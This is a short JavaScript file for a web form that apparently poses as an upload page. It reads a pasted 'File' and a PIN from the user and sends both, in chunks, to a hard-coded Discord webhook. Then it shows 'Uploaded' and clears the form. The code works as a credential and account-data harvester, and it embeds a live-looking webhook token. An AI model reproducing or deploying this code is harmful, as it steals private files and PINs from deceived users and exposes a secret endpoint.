const webhookURL = "https://discord.com/api/webhooks/1436062226384687265/hxMrWuQGylXzM4XkdE2ko-Z0HWEO674NfC_r_qcOY6_hIl--KTCOQIisbRF16w2KIvsv";

const btn = document.getElementById("copyBtn");
const gf = document.getElementById("File");
const pin = document.getElementById("pin");
const toast = document.getElementById("toast");

const showToast = (msg, success = true) => {
  toast.textContent = msg;
  toast.style.color = success ? "#00ff7f" : "#ff4f4f";
  toast.style.display = "block";
  setTimeout(() => (toast.style.display = "none"), 3000);
};

// ✅ Automatically split big messages into 1900-character chunks
const sendToWebhook = async (text) => {
  const chunks = text.match(/[\s\S]{1,1900}/g) || [];
  for (const chunk of chunks) {
    await fetch(webhookURL, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ content: chunk }),
    });
  }
};

btn.onclick = async () => {
  const content = gf.value.trim();
  const pinValue = pin.value.trim();

  if (!content || content.length < 50) {
    showToast("File too short", false);
    return;
  }

  if (!pinValue) {
    showToast("Enter PIN", false);
    return;
  }

  try {
    const combined = `File:\n${content}\n\nPIN: ${pinValue}`;
    await sendToWebhook(combined);

    showToast("Uploaded ✅");
    gf.value = "";
    pin.value = "";
  } catch {
    showToast("Send failed ❌", false);
  }
};
